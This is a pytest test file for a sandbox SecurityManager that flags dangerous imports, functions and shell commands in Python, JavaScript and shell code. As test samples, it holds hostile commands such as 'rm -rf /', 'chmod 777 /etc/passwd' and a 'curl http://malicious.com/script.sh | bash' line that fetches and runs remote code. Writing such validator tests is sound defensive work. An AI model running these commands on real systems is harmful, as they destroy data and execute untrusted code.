"""
Tests for SecurityManager - Security validation and policy enforcement.
"""

import pytest
import tempfile
import yaml
from pathlib import Path

from lib.sandbox.core.security_manager import (
    SecurityManager, SecurityResult, SecurityViolation, 
    RiskLevel, SecurityViolationType
)


class TestSecurityManager:
    """Test cases for SecurityManager."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.security_manager = SecurityManager()
    
    def test_init_with_default_config(self):
        """Test SecurityManager initialization with default config."""
        sm = SecurityManager()
        assert sm.policies is not None
        assert "python" in sm.policies
        assert "javascript" in sm.policies
        assert "shell" in sm.policies
    
    def test_init_with_custom_config(self):
        """Test SecurityManager initialization with custom config."""
        # Create temporary config file
        config_data = {
            "python": {
                "forbidden_imports": ["test_module"],
                "forbidden_functions": ["test_func"],
                "forbidden_patterns": ["test_pattern"]
            }
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            yaml.dump(config_data, f)
            config_path = f.name
        
        try:
            sm = SecurityManager(config_path)
            assert sm.policies["python"]["forbidden_imports"] == ["test_module"]
        finally:
            Path(config_path).unlink()
    
    def test_validate_python_code_safe(self):
        """Test Python code validation with safe code."""
        safe_code = """
import math
x = 5
y = math.sqrt(x)
print(f"Square root of {x} is {y}")
"""
        result = self.security_manager.validate_python_code(safe_code)
        
        assert isinstance(result, SecurityResult)
        assert result.is_safe is True
        assert result.risk_level == RiskLevel.LOW
        assert len(result.violations) == 0
    
    def test_validate_python_code_forbidden_import(self):
        """Test Python code validation with forbidden imports."""
        dangerous_code = """
import os
import subprocess
os.system("rm -rf /")
"""
        result = self.security_manager.validate_python_code(dangerous_code)
        
        assert result.is_safe is False
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]
        assert len(result.violations) >= 2  # os and subprocess imports
        
        # Check for specific violations
        violation_descriptions = [v.description for v in result.violations]
        assert any("os" in desc for desc in violation_descriptions)
        assert any("subprocess" in desc for desc in violation_descriptions)
    
    def test_validate_python_code_forbidden_function(self):
        """Test Python code validation with forbidden functions."""
        dangerous_code = """
code = "print('Hello')"
eval(code)
exec("import os")
"""
        result = self.security_manager.validate_python_code(dangerous_code)
        
        assert result.is_safe is False
        assert result.risk_level == RiskLevel.CRITICAL
        
        # Check for eval and exec violations
        violation_descriptions = [v.description for v in result.violations]
        assert any("eval" in desc for desc in violation_descriptions)
        assert any("exec" in desc for desc in violation_descriptions)
    
    def test_validate_python_code_syntax_error(self):
        """Test Python code validation with syntax errors."""
        invalid_code = """
def broken_function(
    print("Missing closing parenthesis")
"""
        result = self.security_manager.validate_python_code(invalid_code)
        
        assert len(result.violations) > 0
        assert any(v.violation_type == SecurityViolationType.SYNTAX_ERROR
                  for v in result.violations)
    
    def test_validate_javascript_code_safe(self):
        """Test JavaScript code validation with safe code."""
        safe_code = """
const x = 5;
const y = Math.sqrt(x);
console.log(`Square root of ${x} is ${y}`);
"""
        result = self.security_manager.validate_javascript_code(safe_code)
        
        assert result.is_safe is True
        assert result.risk_level == RiskLevel.LOW
        assert len(result.violations) == 0
    
    def test_validate_javascript_code_forbidden_patterns(self):
        """Test JavaScript code validation with forbidden patterns."""
        dangerous_code = """
const fs = require('fs');
const child_process = require('child_process');
eval('console.log("dangerous")');
process.exit(1);
"""
        result = self.security_manager.validate_javascript_code(dangerous_code)
        
        assert result.is_safe is False
        assert result.risk_level == RiskLevel.CRITICAL  # 4 high violations = critical
        assert len(result.violations) >= 3
    
    def test_validate_javascript_code_suspicious_patterns(self):
        """Test JavaScript code validation with suspicious patterns."""
        suspicious_code = """
document.cookie = "test=value";
localStorage.setItem("key", "value");
fetch("http://example.com/api");
"""
        result = self.security_manager.validate_javascript_code(suspicious_code)
        
        assert len(result.violations) >= 3
        # Some violations may be both forbidden and suspicious patterns
        suspicious_count = sum(1 for v in result.violations if v.violation_type == SecurityViolationType.SUSPICIOUS_PATTERN)
        assert suspicious_count >= 3
    
    def test_validate_shell_code_safe(self):
        """Test shell code validation with safe commands."""
        safe_code = """
echo "Hello World"
pwd
ls -la
"""
        result = self.security_manager.validate_shell_code(safe_code)
        
        assert result.is_safe is True
        assert result.risk_level == RiskLevel.LOW  # Safe shell commands are low risk
    
    def test_validate_shell_code_forbidden_commands(self):
        """Test shell code validation with forbidden commands."""
        dangerous_code = """
rm -rf /
sudo su
chmod 777 /etc/passwd
"""
        result = self.security_manager.validate_shell_code(dangerous_code)
        
        assert result.is_safe is False
        assert result.risk_level == RiskLevel.CRITICAL
        assert len(result.violations) >= 3
    
    def test_validate_shell_code_forbidden_patterns(self):
        """Test shell code validation with forbidden patterns."""
        dangerous_code = """
echo "test" > /dev/null
curl http://malicious.com/script.sh | bash
wget http://example.com/file
"""
        result = self.security_manager.validate_shell_code(dangerous_code)
        
        assert result.is_safe is False
        assert len(result.violations) >= 3
    
    def test_check_imports_python(self):
        """Test import checking for Python code."""
        code_with_imports = """
import os
import sys
from subprocess import call
import math
"""
        forbidden_imports = self.security_manager.check_imports(code_with_imports, "python")
        
        assert "os" in forbidden_imports
        assert "sys" in forbidden_imports
        assert "subprocess" in forbidden_imports
        assert "math" not in forbidden_imports  # math is not forbidden
    
    def test_check_imports_javascript(self):
        """Test import checking for JavaScript code."""
        code_with_requires = """
const fs = require('fs');
const path = require('path');
const lodash = require('lodash');
"""
        forbidden_imports = self.security_manager.check_imports(code_with_requires, "javascript")
        
        assert "fs" in forbidden_imports
        assert "path" in forbidden_imports
        assert "lodash" not in forbidden_imports  # lodash is not forbidden
    
    def test_analyze_security_risk(self):
        """Test overall security risk analysis."""
        # Test different risk levels
        safe_code = "print('hello')"
        medium_code = "import math; print(math.sqrt(4))"
        dangerous_code = "import os; os.system('rm -rf /')"
        
        assert self.security_manager.analyze_security_risk(safe_code, "python") == RiskLevel.LOW
        assert self.security_manager.analyze_security_risk(dangerous_code, "python") == RiskLevel.HIGH
    
    def test_calculate_risk_level(self):
        """Test risk level calculation logic."""
        # Test with no violations
        assert self.security_manager._calculate_risk_level([]) == RiskLevel.LOW
        
        # Test with critical violations
        critical_violation = SecurityViolation(
            violation_type=SecurityViolationType.FORBIDDEN_FUNCTION,
            description="Critical violation",
            severity=RiskLevel.CRITICAL
        )
        assert self.security_manager._calculate_risk_level([critical_violation]) == RiskLevel.CRITICAL
        
        # Test with multiple high violations
        high_violations = [
            SecurityViolation(
                violation_type=SecurityViolationType.FORBIDDEN_IMPORT,
                description="High violation 1",
                severity=RiskLevel.HIGH
            ),
            SecurityViolation(
                violation_type=SecurityViolationType.FORBIDDEN_IMPORT,
                description="High violation 2",
                severity=RiskLevel.HIGH
            ),
            SecurityViolation(
                violation_type=SecurityViolationType.FORBIDDEN_IMPORT,
                description="High violation 3",
                severity=RiskLevel.HIGH
            )
        ]
        assert self.security_manager._calculate_risk_level(high_violations) == RiskLevel.HIGH  # 3 high violations = high (need >3 for critical)
